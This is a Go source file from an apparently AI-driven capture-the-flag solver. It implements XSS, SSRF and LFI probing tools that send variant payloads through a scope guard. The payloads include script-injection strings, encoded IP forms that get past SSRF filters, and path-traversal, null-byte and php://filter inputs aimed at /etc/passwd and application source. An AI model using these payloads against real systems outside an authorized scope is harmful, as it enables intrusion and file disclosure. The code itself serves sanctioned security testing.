package solver

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/well-lzz/chronos/internal/nettools"
)

// Vulnerability checks. Each confirms whether a class of weakness is actually
// present by sending a bounded set of GENERAL technique variants and testing a
// concrete success marker — reflection structure (XSS), a response differential
// (SSRF), or known file content (LFI). They carry no target-specific data, are
// stateless, and route every request through the same scope guard as
// http_request, so a check can never reach a host outside the authorized scope. A
// check only confirms the weakness and returns the technique + evidence; the
// model then uses http_request/run_python to retrieve the flag.

const checkVariantCap = 30 // never send more than this many variants per call

func randToken() string {
	b := make([]byte, 5)
	_, _ = rand.Read(b)
	return "zq" + hex.EncodeToString(b) // distinctive, unlikely to occur naturally
}

// sendCheck injects value into one query parameter of rawURL (on the wire,
// verbatim — the caller controls encoding so double-encoding etc. survive),
// scope-checks the host, and returns the response display.
func (s *Solver) sendCheck(ctx context.Context, rawURL, method, param, wireValue string) (display string, ok bool, errMsg string) {
	base := rawURL
	if !strings.Contains(base, "://") {
		base = "http://" + base
	}
	u, err := url.Parse(base)
	if err != nil {
		return "", false, "bad url: " + err.Error()
	}
	if ok, msg := s.hostAllowed(u.Hostname()); !ok {
		return "", false, msg
	}
	// Set the query param verbatim, preserving any other existing params.
	existing := u.RawQuery
	pair := url.QueryEscape(param) + "=" + wireValue
	if existing != "" {
		// replace an existing instance of the param, else append
		parts := strings.Split(existing, "&")
		replaced := false
		for i, p := range parts {
			if strings.HasPrefix(p, url.QueryEscape(param)+"=") || strings.HasPrefix(p, param+"=") {
				parts[i] = pair
				replaced = true
			}
		}
		if !replaced {
			parts = append(parts, pair)
		}
		u.RawQuery = strings.Join(parts, "&")
	} else {
		u.RawQuery = pair
	}
	allow := func(h string) bool { return s.scopeSnapshot().Allows(h) }
	return nettools.DoRawHTTP(ctx, u.String(), method, nil, "", 30*time.Second, allow, s.insecureTLS), true, ""
}

// ---------- XSS ----------

type xssVariant struct {
	Family  string // human label
	Wire    string // the query value sent on the wire
	Survive string // substring that, if present verbatim in the response, proves the delimiter chars were reflected unescaped
}

// xssVariants builds reflection inputs around a unique marker. Each is a general
// context family; success = the structural delimiters are reflected unescaped.
func xssVariants(marker string) []xssVariant {
	return []xssVariant{
		{"tag-insertion", "<" + marker + ">", "<" + marker + ">"},
		{"img-onerror", "<img src=x onerror=" + marker + ">", "<img src=x onerror=" + marker + ">"},
		{"svg-onload", "<svg onload=" + marker + ">", "<svg onload=" + marker + ">"},
		{"attr-doublequote", marker + "\" o" + marker + "=1 x=\"", marker + "\" o" + marker + "=1"},
		{"attr-singlequote", marker + "' o" + marker + "=1 x='", marker + "' o" + marker + "=1"},
		{"js-string-doublequote", marker + "\";" + marker + "//", marker + "\";" + marker},
		{"js-string-singlequote", marker + "';" + marker + "//", marker + "';" + marker},
		{"script-close", "</script><" + marker + ">", "</script><" + marker + ">"},
	}
}

func (s *Solver) toolXSSCheck(ctx context.Context, argsJSON string) string {
	var a struct {
		URL    string `json:"url"`
		Param  string `json:"param"`
		Method string `json:"method"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &a); err != nil {
		return "xss_check error: bad args: " + err.Error()
	}
	if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Param) == "" {
		return "xss_check error: url and param are required"
	}
	marker := randToken()
	// Baseline: does the plain marker reflect in the RESPONSE BODY at all? Checking
	// the body only (not the whole transcript) excludes the echoed request URL,
	// which always contains the input and would otherwise be a false positive.
	baseDisplay, ok, msg := s.sendCheck(ctx, a.URL, a.Method, a.Param, marker)
	if !ok {
		return msg
	}
	reflects := strings.Contains(httpBody(baseDisplay), marker)

	type res struct {
		Family    string `json:"family"`
		Input     string `json:"input"`
		Unescaped bool   `json:"unescaped"`
		Evidence  string `json:"evidence,omitempty"`
	}
	var out []res
	variants := xssVariants(marker)
	if len(variants) > checkVariantCap {
		variants = variants[:checkVariantCap]
	}
	for _, v := range variants {
		display, ok, _ := s.sendCheck(ctx, a.URL, a.Method, a.Param, v.Wire)
		if !ok {
			continue
		}
		// Unescaped only if the delimiter structure survived in the response body —
		// and only meaningful when the param actually reflects there.
		unescaped := reflects && strings.Contains(httpBody(display), v.Survive)
		r := res{Family: v.Family, Input: v.Wire, Unescaped: unescaped}
		if unescaped {
			if tid, err := s.tl.RecordHTTP(methodOr(a.Method), a.URL+"?"+a.Param+"=…", nil, "", display, s.ModelSpec); err == nil {
				r.Evidence = tid
			}
		}
		out = append(out, r)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Unescaped && !out[j].Unescaped })
	return jsonOut(map[string]any{
		"marker_reflected": reflects,
		"results":          out,
		"note":             "unescaped=true means the delimiter characters were reflected without HTML-escaping around the marker (the input is not neutralized in that context). Build the final input from an unescaped family, then confirm with http_request.",
	})
}

// ---------- SSRF ----------

// ssrfVariants rewrites the host of target into general host-encoding forms.
// target must already be in scope (the caller enforces it); these only change how
// the host is written, never which host it is.
func ssrfVariants(target string) []struct{ Family, URL string } {
	u, err := url.Parse(target)
	if err != nil || u.Hostname() == "" {
		return nil
	}
	host := u.Hostname()
	port := u.Port()
	withHost := func(h string) string {
		nu := *u
		if port != "" {
			nu.Host = h + ":" + port
		} else {
			nu.Host = h
		}
		return nu.String()
	}
	var vs []struct{ Family, URL string }
	add := func(fam, h string) { vs = append(vs, struct{ Family, URL string }{fam, withHost(h)}) }

	add("raw", host)
	add("trailing-dot", host+".")
	add("userinfo-confusion", "expected@"+host) // http://expected@TARGET/
	if ip := parseIPv4(host); ip != nil {
		d := uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
		add("decimal-ip", fmt.Sprintf("%d", d))
		add("octal-ip", fmt.Sprintf("0%o.0%o.0%o.0%o", ip[0], ip[1], ip[2], ip[3]))
		add("hex-ip", fmt.Sprintf("0x%02x.0x%02x.0x%02x.0x%02x", ip[0], ip[1], ip[2], ip[3]))
		add("hex-dword", fmt.Sprintf("0x%08x", d))
		add("ipv6-mapped", fmt.Sprintf("[::ffff:%d.%d.%d.%d]", ip[0], ip[1], ip[2], ip[3]))
	}
	return vs
}

func (s *Solver) toolSSRFCheck(ctx context.Context, argsJSON string) string {
	var a struct {
		URL    string `json:"url"`
		Param  string `json:"param"`
		Target string `json:"target"`
		Method string `json:"method"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &a); err != nil {
		return "ssrf_check error: bad args: " + err.Error()
	}
	if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Param) == "" || strings.TrimSpace(a.Target) == "" {
		return "ssrf_check error: url (the fetch sink), param, and target (the in-scope internal URL to reach) are required"
	}
	// The internal target the server will be asked to fetch MUST be in scope — the
	// check only confirms the filter's handling within scope, never a pivot to
	// another team's/task's host.
	tu, err := url.Parse(a.Target)
	if err != nil || tu.Hostname() == "" {
		return "ssrf_check error: target must be an absolute URL"
	}
	if ok, _ := s.hostAllowed(tu.Hostname()); !ok {
		return "ssrf_check refused: target host " + tu.Hostname() + " is outside the authorized scope. This check is only permitted against in-scope internal targets."
	}
	variants := ssrfVariants(a.Target)
	if len(variants) > checkVariantCap {
		variants = variants[:checkVariantCap]
	}

	// Baseline is the RAW (unencoded) in-scope target — never an out-of-scope host.
	// If the sink's filter blocks the raw target, a variant whose response differs
	// was handled differently by the filter. The signature is status + response
	// body only (outcomeSignature), so the per-variant request URL can't fake a
	// difference.
	type row struct {
		family, value, sig, display string
	}
	var rows []row
	baselineSig := ""
	for _, v := range variants {
		display, ok, _ := s.sendCheck(ctx, a.URL, a.Method, a.Param, v.URL)
		if !ok {
			continue
		}
		sig := outcomeSignature(display)
		if v.Family == "raw" {
			baselineSig = sig
		}
		rows = append(rows, row{v.Family, v.URL, sig, display})
	}

	type res struct {
		Family   string `json:"family"`
		Value    string `json:"value"`
		Changed  bool   `json:"changed_vs_raw"`
		Sig      string `json:"signature"`
		Evidence string `json:"evidence,omitempty"`
	}
	var out []res
	for _, r := range rows {
		changed := r.family != "raw" && baselineSig != "" && r.sig != baselineSig
		rr := res{Family: r.family, Value: r.value, Changed: changed, Sig: r.sig}
		if changed {
			if tid, err := s.tl.RecordHTTP(methodOr(a.Method), a.URL+"?"+a.Param+"="+r.value, nil, "", r.display, s.ModelSpec); err == nil {
				rr.Evidence = tid
			}
		}
		out = append(out, rr)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Changed && !out[j].Changed })
	return jsonOut(map[string]any{
		"raw_baseline_signature": baselineSig,
		"results":                out,
		"note":                   "changed_vs_raw=true means that host encoding produced a DIFFERENT status/body than the raw target — the host filter handled it differently. If the raw target is already allowed there is no filter to work around. Confirm the fetched content with traffic_get. All requests stay within the authorized scope.",
	})
}

// ---------- LFI ----------

var passwdSig = regexp.MustCompile(`root:.*?:0:0:`)

func lfiVariants(samplePath, prefix, suffix string) []struct{ Family, Wire string } {
	// samplePath is an absolute path like /etc/passwd. prefix/suffix are what the
	// app prepends/appends (from recon), so we can escape a fixed base dir.
	trav := func(depth int) string { return strings.Repeat("../", depth) }
	clean := strings.TrimPrefix(samplePath, "/")
	var vs []struct{ Family, Wire string }
	add := func(fam, wire string) { vs = append(vs, struct{ Family, Wire string }{fam, wire}) }

	add("absolute", samplePath)
	for _, d := range []int{3, 6, 10} {
		add(fmt.Sprintf("traversal-%d", d), trav(d)+clean)
		add(fmt.Sprintf("traversal-enc-%d", d), strings.Repeat("..%2f", d)+clean)
		add(fmt.Sprintf("traversal-dblenc-%d", d), strings.Repeat("..%252f", d)+clean)
		add(fmt.Sprintf("traversal-dotslash-%d", d), strings.Repeat("....//", d)+clean)
	}
	add("nullbyte", trav(6)+clean+"%00")
	// php://filter to read source (base64) — samplePath here is the resource path.
	add("php-filter-b64", "php://filter/convert.base64-encode/resource="+samplePath)
	if prefix != "" || suffix != "" {
		// Try to escape a fixed prefix/suffix the app wraps around the value.
		add("prefix-traversal", trav(10)+clean)
		add("suffix-nullbyte", trav(10)+clean+"%00")
	}
	return vs
}

func (s *Solver) toolLFICheck(ctx context.Context, argsJSON string) string {
	var a struct {
		URL          string `json:"url"`
		Param        string `json:"param"`
		SamplePath   string `json:"sample_path"`
		Prefix       string `json:"prefix"`
		Suffix       string `json:"suffix"`
		Base64Decode bool   `json:"base64_decode"`
		Method       string `json:"method"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &a); err != nil {
		return "lfi_check error: bad args: " + err.Error()
	}
	if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Param) == "" {
		return "lfi_check error: url and param are required"
	}
	if strings.TrimSpace(a.SamplePath) == "" {
		a.SamplePath = "/etc/passwd"
	}

	type res struct {
		Family   string `json:"family"`
		Input    string `json:"input"`
		Read     bool   `json:"read"`
		Excerpt  string `json:"excerpt,omitempty"`
		Evidence string `json:"evidence,omitempty"`
	}
	variants := lfiVariants(a.SamplePath, a.Prefix, a.Suffix)
	if len(variants) > checkVariantCap {
		variants = variants[:checkVariantCap]
	}
	var out []res
	for _, v := range variants {
		display, ok, _ := s.sendCheck(ctx, a.URL, a.Method, a.Param, v.Wire)
		if !ok {
			continue
		}
		// Scan the response body only (not the echoed request URL/headers).
		read, excerpt := lfiReadOK(httpBody(display), a.SamplePath, a.Base64Decode || strings.Contains(v.Family, "php-filter"))
		r := res{Family: v.Family, Input: v.Wire, Read: read, Excerpt: excerpt}
		if read {
			if tid, err := s.tl.RecordHTTP(methodOr(a.Method), a.URL+"?"+a.Param+"="+v.Wire, nil, "", display, s.ModelSpec); err == nil {
				r.Evidence = tid
			}
		}
		out = append(out, r)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Read && !out[j].Read })
	return jsonOut(map[string]any{
		"sample_path": a.SamplePath,
		"results":     out,
		"note":        "read=true means the sample file's known content was returned — the include/read is reachable via that family. Re-point it at the target file (e.g. the flag or app source) with http_request. php-filter families return base64 source; decode it.",
	})
}

// lfiReadOK decides whether a response actually read the sample file.
func lfiReadOK(display, samplePath string, tryBase64 bool) (bool, string) {
	if strings.Contains(samplePath, "passwd") && passwdSig.MatchString(display) {
		if m := passwdSig.FindString(display); m != "" {
			return true, m
		}
		return true, "root:…:0:0:"
	}
	if tryBase64 {
		for _, tok := range base64Candidates(display) {
			if dec, err := base64.StdEncoding.DecodeString(tok); err == nil && looksLikeSource(dec) {
				ex := string(dec)
				if len(ex) > 120 {
					ex = ex[:120]
				}
				return true, ex
			}
		}
	}
	return false, ""
}

var b64Re = regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`)

func base64Candidates(s string) []string {
	return b64Re.FindAllString(s, 5)
}

func looksLikeSource(b []byte) bool {
	s := string(b)
	for _, tok := range []string{"<?php", "<?=", "function", "import ", "def ", "#!/", "<html", "#include", "package "} {
		if strings.Contains(s, tok) {
			return true
		}
	}
	// mostly-printable heuristic
	printable := 0
	for _, c := range b {
		if c == '\n' || c == '\t' || (c >= 32 && c < 127) {
			printable++
		}
	}
	return len(b) > 0 && printable*100/len(b) >= 90
}

func parseIPv4(host string) []byte {
	parts := strings.Split(host, ".")
	if len(parts) != 4 {
		return nil
	}
	out := make([]byte, 4)
	for i, p := range parts {
		n := 0
		if len(p) == 0 || len(p) > 3 {
			return nil
		}
		for _, c := range p {
			if c < '0' || c > '9' {
				return nil
			}
			n = n*10 + int(c-'0')
		}
		if n > 255 {
			return nil
		}
		out[i] = byte(n)
	}
	return out
}
